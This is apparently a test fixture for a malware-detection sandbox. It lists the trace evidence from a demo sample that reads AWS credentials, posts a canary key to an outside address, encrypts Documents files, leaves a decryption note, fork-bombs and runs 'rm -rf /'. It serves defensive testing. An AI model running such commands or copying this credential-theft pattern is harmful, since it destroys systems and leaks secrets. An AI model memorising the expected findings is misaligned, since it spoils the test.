@@ -1,0 +1,202 @@
+{
+  "description": "Section 11 demo sample: steals AWS key, tries to send it, encrypts Documents, fork-bombs, runs rm -rf /.",
+  "path": "run",
+  "complete": true,
+  "expect": {
+    "signals": [
+      "unknown-hosts"
+    ],
+    "depth": "trench",
+    "family": "extortion-destruction",
+    "findings": [
+      "steal-credentials",
+      "exfil-attempt",
+      "encrypt",
+      "resource-hijack",
+      "system-wipe"
+    ]
+  },
+  "evidence": [
+    {
+      "id": "ev-1",
+      "source": "trace",
+      "kind": "execve",
+      "detail": "execve /usr/bin/python3",
+      "at": "2026-01-01T00:00:00.000Z",
+      "path": "/usr/bin/python3",
+      "argv": [
+        "python3",
+        "/in/sample"
+      ]
+    },
+    {
+      "id": "ev-2",
+      "source": "trace",
+      "kind": "file-read",
+      "detail": "file-read /home/dana/.aws/credentials",
+      "at": "2026-01-01T00:00:01.000Z",
+      "path": "/home/dana/.aws/credentials"
+    },
+    {
+      "id": "ev-3",
+      "source": "trace",
+      "kind": "file-read",
+      "detail": "file-read /home/dana/Documents/Q3-report.docx",
+      "at": "2026-01-01T00:00:02.000Z",
+      "path": "/home/dana/Documents/Q3-report.docx"
+    },
+    {
+      "id": "ev-4",
+      "source": "trace",
+      "kind": "file-read",
+      "detail": "file-read /home/dana/Documents/budget.xlsx",
+      "at": "2026-01-01T00:00:03.000Z",
+      "path": "/home/dana/Documents/budget.xlsx"
+    },
+    {
+      "id": "ev-5",
+      "source": "trace",
+      "kind": "file-read",
+      "detail": "file-read /home/dana/Documents/notes.txt",
+      "at": "2026-01-01T00:00:04.000Z",
+      "path": "/home/dana/Documents/notes.txt"
+    },
+    {
+      "id": "ev-6",
+      "source": "trace",
+      "kind": "file-read",
+      "detail": "file-read /home/dana/Documents/photos-list.csv",
+      "at": "2026-01-01T00:00:05.000Z",
+      "path": "/home/dana/Documents/photos-list.csv"
+    },
+    {
+      "id": "ev-7",
+      "source": "trace",
+      "kind": "connect",
+      "detail": "connect 203.0.113.9",
+      "at": "2026-01-01T00:00:06.000Z",
+      "host": "203.0.113.9",
+      "port": 443,
+      "payloadPreview": "POST /collect HTTP/1.1 key=CANARY-AWS-7f3a9c"
+    },
+    {
+      "id": "ev-8",
+      "source": "trace",
+      "kind": "file-write",
+      "detail": "file-write /home/dana/Documents/README_DECRYPT.txt",
+      "at": "2026-01-01T00:00:07.000Z",
+      "path": "/home/dana/Documents/README_DECRYPT.txt"
+    },
+    {
+      "id": "ev-9",
+      "source": "trace",
+      "kind": "clone-eagain",
+      "detail": "1874 process creations failed after 126 succeeded",
+      "at": "2026-01-01T00:00:08.000Z",
+      "count": 1874,
+      "created": 126
+    },
+    {
+      "id": "ev-10",
+      "source": "trace",
+      "kind": "execve",
+      "detail": "execve /bin/rm",
+      "at": "2026-01-01T00:00:09.000Z",
+      "path": "/bin/rm",
+      "argv": [
+        "rm",
+        "-rf",
+        "/"
+      ]
+    },
+    {
+      "id": "ev-11",
+      "source": "trace",
+      "kind": "unlink",
+      "detail": "unlink /bin/ls",
+      "at": "2026-01-01T00:00:10.000Z",
+      "path": "/bin/ls"
+    },
+    {
+      "id": "ev-12",
+      "source": "trace",
+      "kind": "unlink",
+      "detail": "unlink /etc/passwd",
+      "at": "2026-01-01T00:00:11.000Z",
+      "path": "/etc/passwd"
+    },
+    {
+      "id": "ev-13",
+      "source": "trace",
+      "kind": "rmdir",
+      "detail": "rmdir /usr/lib",
+      "at": "2026-01-01T00:00:12.000Z",
+      "path": "/usr/lib"
+    },
+    {
+      "id": "ev-14",
+      "source": "diff",
+      "kind": "changed",
+      "detail": "changed /home/dana/Documents/Q3-report.docx",
+      "at": "2026-01-01T00:00:13.000Z",
+      "path": "/home/dana/Documents/Q3-report.docx",
+      "seeded": true,
+      "entropyBefore": 4.6,
+      "entropyAfter": 7.9,
+      "sizeBefore": 800,
+      "sizeAfter": 800
+    },
+    {
+      "id": "ev-15",
+      "source": "diff",
+      "kind": "changed",
+      "detail": "changed /home/dana/Documents/budget.xlsx",
+      "at": "2026-01-01T00:00:14.000Z",
+      "path": "/home/dana/Documents/budget.xlsx",
+      "seeded": true,
+      "entropyBefore": 4.6,
+      "entropyAfter": 7.9,
+      "sizeBefore": 800,
+      "sizeAfter": 800
+    },
+    {
+      "id": "ev-16",
+      "source": "diff",
+      "kind": "changed",
+      "detail": "changed /home/dana/Documents/notes.txt",
+      "at": "2026-01-01T00:00:15.000Z",
+      "path": "/home/dana/Documents/notes.txt",
+      "seeded": true,
+      "entropyBefore": 4.6,
+      "entropyAfter": 7.9,
+      "sizeBefore": 800,
+      "sizeAfter": 800
+    },
+    {
+      "id": "ev-17",
+      "source": "diff",
+      "kind": "changed",
+      "detail": "changed /home/dana/Documents/photos-list.csv",
+      "at": "2026-01-01T00:00:16.000Z",
+      "path": "/home/dana/Documents/photos-list.csv",
+      "seeded": true,
+      "entropyBefore": 4.6,
+      "entropyAfter": 7.9,
+      "sizeBefore": 800,
+      "sizeAfter": 800
+    },
+    {
+      "id": "ev-18",
+      "source": "diff",
+      "kind": "added",
+      "detail": "added /home/dana/Documents/README_DECRYPT.txt",
+      "at": "2026-01-01T00:00:17.000Z",
+      "path": "/home/dana/Documents/README_DECRYPT.txt",
+      "seeded": false,
+      "entropyBefore": null,
+      "entropyAfter": 4.4,
+      "sizeBefore": null,
+      "sizeAfter": 300
+    }
+  ]
+}
